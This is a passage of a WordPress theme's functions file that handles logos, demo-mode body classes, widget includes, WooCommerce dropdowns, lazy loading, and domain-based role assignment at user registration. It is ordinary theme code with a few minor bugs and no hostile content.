		$default_width	  = $vg_calaco_options['website_width'];
		
		// Check Demo Mode
		$demo_mode = $vg_calaco_options['demo_mode'];
		if($demo_mode) 
		{
			$demos = vg_calaco_get_demo_settings();
			$demo  = reset($demos);
			
			if(count($demo)) {
				$default_layout = $demo['layout'];
				$default_preset = $demo['preset'];
				$default_width  = $demo['width'];
			}
			
			// Get layout from URL
			$niche = get_query_var('demo', '');
			if(!empty($niche) && isset($demos[$niche]) && count($demos[$niche])) {
				$default_layout = $demos[$niche]['layout'];
				$default_preset = $demos[$niche]['preset'];
				$default_width  = $demos[$niche]['width'];
			}		
		}
		
		// Set Class for Body Tag
		$classes[] = $default_layout;
		$classes[] = $default_preset;
		$classes[] = $default_width;
		
		return $classes;
	}
}
add_filter('body_class', 'vg_calaco_set_body_class');


/******************************************************************************/
/***************************** Display Top Logo *******************************/
/******************************************************************************/

if(! function_exists('vg_calaco_display_top_logo'))
{
	function vg_calaco_display_top_logo()
	{
		$vg_calaco_options = get_option("vg_calaco_options");
		$demo_mode         = $vg_calaco_options['demo_mode'];
		
		$logo_html_code	= '<a href="'. esc_url(home_url('/')) .'" rel="home">';
		
		if($demo_mode)  // If `demo mode` is enabled.
		{
			$logo_html_code	.= '<span class="logo-background">'. get_bloginfo('name') .'</span>';
		}
		else // If `demo mode` is disabled.
		{
			if((isset($vg_calaco_options['site_logo']['url'])) &&(trim($vg_calaco_options['site_logo']['url']) != "")) 
			{
				// Website Logo
				$site_logo 		 = $vg_calaco_options['site_logo']['url'];
				$logo_html_code	.= '<img class="site-logo" src="'. esc_url($site_logo) .'" alt="'. esc_attr(get_bloginfo('name')) .'" />';
				
				// Mobile Logo
				if((isset($vg_calaco_options['site_logo_mobile']['url'])) &&(trim($vg_calaco_options['site_logo_mobile']['url']) != "")) {
					$sticky_logo 	 = $vg_calaco_options['site_logo_mobile']['url'];
					$logo_html_code	.= '<img class="site-logo-mobile" src="'. esc_url($site_logo) .'" alt="'. esc_attr(get_bloginfo('name')) .'" />';
				}
			}
			else 
			{
				$logo_html_code	.=  '<span class="logo-text">'. get_bloginfo('name') . '</span>';
			}
		}
		
		$logo_html_code .= '</a>';
		
		echo ($logo_html_code);
	}
}
/******************************************************************************/
/***************************** Display Bottom Logo *******************************/
/******************************************************************************/

if(! function_exists('vg_calaco_display_bottom_logo'))
{
	function vg_calaco_display_bottom_logo()
	{
		$vg_calaco_options = get_option("vg_calaco_options");
		$demo_mode         = $vg_calaco_options['demo_mode'];
		
		$logo_html_code	= '<a href="'. esc_url(home_url('/')) .'" rel="home">';
		
		if($demo_mode)  // If `demo mode` is enabled.
		{
			$logo_html_code	.= '<span class="logo-background-footer">'. get_bloginfo('name') .'</span>';
		}
		else // If `demo mode` is disabled.
		{
			if((isset($vg_calaco_options['logo_footer']['url'])) &&(trim($vg_calaco_options['logo_footer']['url']) != "")) 
			{
				// Website Logo
				$logo_footer 		 = $vg_calaco_options['logo_footer']['url'];
				$logo_html_code	.= '<img class="site-logo-footer" src="'. esc_url($logo_footer) .'" alt="'. esc_attr(get_bloginfo('name')) .'" />';
				
				// Mobile Logo
				if((isset($vg_calaco_options['site_logo_mobile']['url'])) &&(trim($vg_calaco_options['site_logo_mobile']['url']) != "")) {
					$sticky_logo 	 = $vg_calaco_options['site_logo_mobile']['url'];
					$logo_html_code	.= '<img class="site-logo-mobile" src="'. esc_url($site_logo) .'" alt="'. esc_attr(get_bloginfo('name')) .'" />';
				}
			}
			else 
			{
				$logo_html_code	.=  '<span class="logo-text">'. get_bloginfo('name') . '</span>';
			}
		}
		
		$logo_html_code .= '</a>';
		
		echo ($logo_html_code);
	}
}

// get all files from a folder
if(! function_exists('vg_calaco_get_all_files'))
{
	function vg_calaco_get_all_files($dir)
	{
		$result = array();
		$cdir  	= scandir($dir);
		
		foreach($cdir as $key => $value)
		{
			if(!in_array($value, array(".", "..")))
			{
				if(is_file($dir . DIRECTORY_SEPARATOR . $value))
				{
					$result[] = $value;
				}			
			}
		}
		
		return $result;
	}
}


/******************************************************************************/
/************************ Return Global Variables *****************************/
/******************************************************************************/
if(! function_exists('vg_calaco_global_variable'))
{
	function vg_calaco_global_variable($variable) {
		global $$variable;
		return $$variable;
	}
}

/******************************************************************************/
/***************************** Include Library ********************************/
/******************************************************************************/

// Custom Tags
require get_template_directory() . '/includes/template-tags.php';

// Breadcrumb
require get_template_directory() . '/includes/breadcrumb.php';

// Custom Mega Menu
include_once(get_template_directory() . '/includes/custom-menu/custom-menu.php');

// Product Search Widget
include_once(get_template_directory() . '/includes/widgets/product-search.php');

if (class_exists('WooCommerce')){
	// Product Carousel Widget
	include_once(get_template_directory() . '/includes/widgets/product-carousel.php');
}

// Post Carousel Widget
include_once(get_template_directory() . '/includes/widgets/post-carousel.php');

// Brand Logos Carousel Widget
include_once(get_template_directory() . '/includes/widgets/brand-carousel.php');

// Social Media Widget
include_once(get_template_directory() . '/includes/widgets/social-media.php');

// Testimonials
include_once(get_template_directory() . '/includes/testimonial/admin.php');
include_once(get_template_directory() . '/includes/testimonial/shortcode.php');

// Category Treeview Widget
include_once(get_template_directory() . '/includes/widgets/category-treeview.php');

// Quick View
include_once(get_template_directory() . '/includes/woocommerce/quick-view.php');

// Woo Ajax
include_once(get_template_directory() . '/includes/woocommerce/wooajax.php');


// Load Custom style from Theme Options
include_once(get_template_directory() . '/includes/custom-styles.php');

// Register Shortcode
if(function_exists('vg_helper_register_shortcode')) {
	vg_helper_register_shortcode();
}

/******************************************************************************/
/******************************* Woocommerce **********************************/
/******************************************************************************/
add_theme_support('woocommerce');

// Load Custom style from Theme Options
include_once(get_template_directory() . '/woocommerce/woocommerce-functions.php');


//Calculator Visual Composer
function vg_calaco_cal_vc_width(){
	if(is_rtl() ||(isset($_GET['d']) && $_GET['d'] == 'rtl')){
		$inlineJS = "
			jQuery(function($) {
				var window_width = $(window).width();
				var container_width = $('.container').outerWidth();
				var right = (container_width - window_width)/2;
				$('.vc_row[data-vc-full-width=\"true\"]').css({'right' : right});
			});
		";
		wp_add_inline_script('vg-calaco-js', $inlineJS);
	}
}
add_action('wp_head', 'vg_calaco_cal_vc_width');

/******************************************************************************/
/******************************* Default Style **********************************/
/******************************************************************************/

function vg_calaco_hover_effect_banner() {
	$vg_calaco_options = get_option("vg_calaco_options");
	
	$effectBanner = (isset($vg_calaco_options['effect_banner']) && $vg_calaco_options['effect_banner']!='') ? $vg_calaco_options['effect_banner'] : '';
	
	$customJS = "
		jQuery(document).ready(function($){					
			$('.banner-box').addClass('". esc_js($effectBanner) ."');
			$('.widget_sp_image').addClass('". esc_js($effectBanner) ."');
			$('.wpb_single_image').addClass('". esc_js($effectBanner) ."');
		});
	";
	wp_add_inline_script('vg-calaco-js', $customJS);
}
add_action('wp_head', 'vg_calaco_hover_effect_banner');


function vg_calaco_default_woo_hover_effect(){
	
	$vg_calaco_options = get_option("vg_calaco_options");
	
	$wooHoverEffect = (isset($vg_calaco_options['default_woo_hover_effect']) && $vg_calaco_options['default_woo_hover_effect']!='') ? $vg_calaco_options['default_woo_hover_effect'] : '';
	
	return $wooHoverEffect;
}

function vg_calaco_default_post_style(){
	$vg_calaco_options = get_option("vg_calaco_options");
	
	$postStyle = (isset($vg_calaco_options['default_post_style']) && $vg_calaco_options['default_post_style']!='') ? $vg_calaco_options['default_post_style'] : '';
	
	return $postStyle;
}

/* Sticky Menu */
function vg_calaco_sticky_header () {
	$vg_calaco_options = get_option("vg_calaco_options");
	
	$stickyJS = (isset($vg_calaco_options['sticky_menu']) && $vg_calaco_options['sticky_menu']) ? "sticky_menu = true;" : "sticky_menu = false;";
	
	wp_add_inline_script('vg-calaco-js', $stickyJS);
}
add_action('wp_head', 'vg_calaco_sticky_header');

if(! function_exists('vg_calaco_display_logo_sticky'))
{
	function vg_calaco_display_logo_sticky()
	{
		$vg_calaco_options = get_option("vg_calaco_options");
		
		$logo_html_code	= '<div class="sticky_logo"><a href="'. esc_url(home_url('/')) .'" rel="home">';
		
		if((isset($vg_calaco_options['sticky_header_logo']['url'])) &&(trim($vg_calaco_options['sticky_header_logo']['url']) != "")) 
		{
			// Website Logo
			$site_logo 		 = $vg_calaco_options['sticky_header_logo']['url'];
			$logo_html_code	.= '<img class="site-logo" src="'. esc_url($site_logo) .'" alt="'. esc_attr(get_bloginfo('name')) .'" />';
		}
		else 
		{
			$logo_html_code	.=  '<span class="logo-background">'. get_bloginfo('name') . '</span>';
		}
		
		$logo_html_code .= '</a></div>';
		
		echo ($logo_html_code);
	}
}


// HieuJa add 20161219
/******************************************************************************/
/******************************* Detect Mobile ********************************/
/******************************************************************************/
if(! function_exists('vg_calaco_is_mobile_layout'))
{
	function vg_calaco_is_mobile_layout()
	{
		require_once get_template_directory() . '/includes/mobile_detect.php';
		$detect = new Mobile_Detect;

		$vg_calaco_options 	= get_option("vg_calaco_options");
		$mobile_layout		= isset($vg_calaco_options['mobile_layout']) ? $vg_calaco_options['mobile_layout'] : false;
		
		if($detect->isMobile() && $mobile_layout) return true;
		else return false;
	}
}
/******************************************************************************/
/******************************* Add Lazy Load ********************************/
/******************************************************************************/
if(!is_admin()){
	function vg_calaco_alter_att_attributes($attr) {
		$attr['data-src'] = $attr['src'];
		$attr['class'] 	  = $attr['class'] . ' lazy';
		$attr['src'] 	  = 'data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==';
		return $attr;
	}
	add_filter('wp_get_attachment_image_attributes', 'vg_calaco_alter_att_attributes');
}
/* Remove Redux Demo Link */
function vg_calaco_removeDemoModeLink()
{
    if(class_exists('ReduxFrameworkPlugin')) {
        remove_filter('plugin_row_meta', array(ReduxFrameworkPlugin::get_instance(), 'plugin_metalinks'), null, 2);
    }
    if(class_exists('ReduxFrameworkPlugin')) {
        remove_action('admin_notices', array(ReduxFrameworkPlugin::get_instance(), 'admin_notices'));    
    }
}
add_action('init', 'vg_calaco_removeDemoModeLink');

/* HJ20170525 Product Variables Options */
function vg_calaco_variation_attribute_options($args = array()) 
{
	$args = wp_parse_args(apply_filters('woocommerce_dropdown_variation_attribute_options_args', $args), array(
		'options'          => false,
		'attribute'        => false,
		'product'          => false,
		'selected' 	       => false,
		'name'             => '',
		'id'               => '',
		'class'            => '',
		'show_option_none' => __('Choose an option', 'vg-calaco'),
	));

	$options               = $args['options'];
	$product               = $args['product'];
	$attribute             = $args['attribute'];
	$name                  = $args['name'] ? $args['name'] : 'attribute_' . sanitize_title($attribute);
	$id                    = $args['id'] ? $args['id'] : sanitize_title($attribute);
	$class                 = $args['class'];
	$show_option_none      = $args['show_option_none'] ? true : false;
	$show_option_none_text = $args['show_option_none'] ? $args['show_option_none'] : __('Choose an option', 'vg-calaco'); // We'll do our best to hide the placeholder, but we'll need to show something when resetting options.

	if (empty($options) && ! empty($product) && ! empty($attribute)) {
		$attributes = $product->get_variation_attributes();
		$options    = $attributes[ $attribute ];
	}

	$html = '<select id="' . esc_attr($id) . '" class="' . esc_attr($class) . '" name="' . esc_attr($name) . '" data-attribute_name="attribute_' . esc_attr(sanitize_title($attribute)) . '" data-show_option_none="' . ($show_option_none ? 'yes' : 'no') . '">';
	$html .= '<option value="">' . esc_html($show_option_none_text) . '</option>';

	if (! empty($options)) {
		if ($product && taxonomy_exists($attribute)) {
			// Get terms if this is a taxonomy - ordered. We need the names too.
			$terms = wc_get_product_terms($product->get_id(), $attribute, array('fields' => 'all'));

			foreach ($terms as $term) {
				if (in_array($term->slug, $options)) {
					$html .= '<option value="' . esc_attr($term->slug) . '" ' . selected(sanitize_title($args['selected']), $term->slug, false) . '>' . esc_html(apply_filters('woocommerce_variation_option_name', $term->name)) . '</option>';
				}
			}
		} else {
			foreach ($options as $option) {
				// This handles < 2.4.0 bw compatibility where text attributes were not sanitized.
				$selected = sanitize_title($args['selected']) === $args['selected'] ? selected($args['selected'], sanitize_title($option), false) : selected($args['selected'], $option, false);
				$html .= '<option value="' . esc_attr($option) . '" ' . $selected . '>' . esc_html(apply_filters('woocommerce_variation_option_name', $option)) . '</option>';
			}
		}
	}

	$html .= '</select>';
	
	return apply_filters('woocommerce_dropdown_variation_attribute_options_html', $html, $args);
	
	
	
}



add_action( 'user_register', 'wp234_set_role_by_email' );
function wp234_set_role_by_email( $user_id ){
    $user = get_user_by( 'id', $user_id );
    $domain = substr(
        strrchr(
            $user->data->user_email, 
            "@"
        ), 1
    ); //Get Domain

    $contributor_domains = array( 'tcs.com' );
    if( in_array( $domain, $contributor_domains ) ){
        foreach( $user->roles as $role )
            $user->remove_role( $role ); //Remove existing Roles
        $user->add_role( 'tcs' ); //Add role
    }

    $subscriber_domains = array( 'wipro.com' );
    if( in_array( $domain, $subscriber_domains ) ){
        foreach( $user->roles as $role )
            $user->remove_role( $role ); //Remove existing Roles
        $user->add_role( 'wipro' ); //Add role
    }
	
	$subscriber_domains = array( 'accenture.com' );
    if( in_array( $domain, $subscriber_domains ) ){
        foreach( $user->roles as $role )
            $user->remove_role( $role ); //Remove existing Roles
        $user->add_role( 'accenture' ); //Add role
    }
	
		$subscriber_domains = array( 'legatohealth.com' );
    if( in_array( $domain, $subscriber_domains ) ){
        foreach( $user->roles as $role )
            $user->remove_role( $role ); //Remove existing Roles
        $user->add_role( 'legatohealth' ); //Add role
    }
	
		$subscriber_domains = array('subex.com');
    if( in_array( $domain, $subscriber_domains ) ){
        foreach( $user->roles as $role )
            $user->remove_role( $role ); //Remove existing Roles
        $user->add_role( 'subex' ); //Add role
    }
	
		$subscriber_domains = array('veniteck.com');
    if( in_array( $domain, $subscriber_domains ) ){
        foreach( $user->roles as $role )
            $user->remove_role( $role ); //Remove existing Roles
        $user->add_role( 'veniteck' ); //Add role
    }
}